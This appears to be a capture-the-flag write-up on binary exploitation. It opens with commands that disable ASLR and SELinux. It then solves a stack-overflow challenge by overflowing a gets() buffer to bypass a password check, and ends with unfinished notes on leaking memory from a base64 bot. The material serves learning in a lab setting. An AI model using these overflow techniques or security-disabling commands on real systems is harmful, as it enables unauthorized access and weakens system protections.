# Exploitation
Anytime you run across these types of challenges
* Disable Address Space Layout Randomization (ASLR)
* Set ulimit to `unlimited` for core file generation
* Disable SELinux
   ```sh
    sysctl kernel.randomize_va_space=0
    ulimit -S -c unlimited > /dev/null 2>&1
    setenforce 0
   ```

### 75pts: [Stack Overflow]
Authenticate without the password. Cause the program to print 'Success!' without crashing it and without the password. Note the value for 'authenticated' as well.

1. Copy the code into a  file: `exploit-75pts.c`
2. The hint tells us it also wants the value of `authenticated`
3. Edit the program and add a `printf()` statement:
   ```sh
    ...
     if (authenticated) {
         printf("Success!\n");
         printf("%d\n",authenticated);
         return 0;
      }
    ...
   ```
4. Code Review: `strncmp()` - `compares the only first (at most) n bytes of s1 and s2`
5. Code Review: `gets()` - ` gets() will continue to store characters past the end of the buffer`
6. Compile: `gcc -Wall exploit-75pts.c -o exploit-75pts` (note the compiler warning)
6. Entering anything greater than 12 characters as a password (clobbering `\0`), should pass `strncmp()` check:
   ```sh
   ./exploit-75pts
   Enter the password: AAAAAAAAAAAAA
   Success!
   65
   ````

### 175pts: [Lonely Bot]
Lonely Bot just wants to talk. (program output in web console).
* I haven't solved this one yet. The following are just some notes.

1. Crash the program (generate core file): `./lonely_bot < /dev/urandom`
2. Base64 input:
   ```sh
   echo -n 'E' | base64
   RQ==

   base64> RQ==
   Now you're speaking my language!!
   Here's everything I know about that:

   No, I don't think that's right.
   Please, tell me more.
   base64> RQ==0x000000000000000000000000000000000000000000000111
   Now you're speaking my language!!
   Here's everything I know about that:

   The answer is 42.
   Please, tell me more.
   base64> Here's everything I know about that:
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
   00 00 00 00 00 18 fe 14 32 67 e8 76 90 21 40 00
   00 00 00 00 39 1a 40 00 00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00 01 00 00 00 48 44 b1 26
   fc 7f 00 00 fe 0b 40 00 00 00 00 00 00 00 00 00
   00 00 00 00 06
   Wow! That's very interesting.
   Please, tell me more.
   base64>
   ```
* Find the correct memory address for the flag?
* Notes/Refs: https://bitvijays.github.io/LFC-BinaryExploitation.html

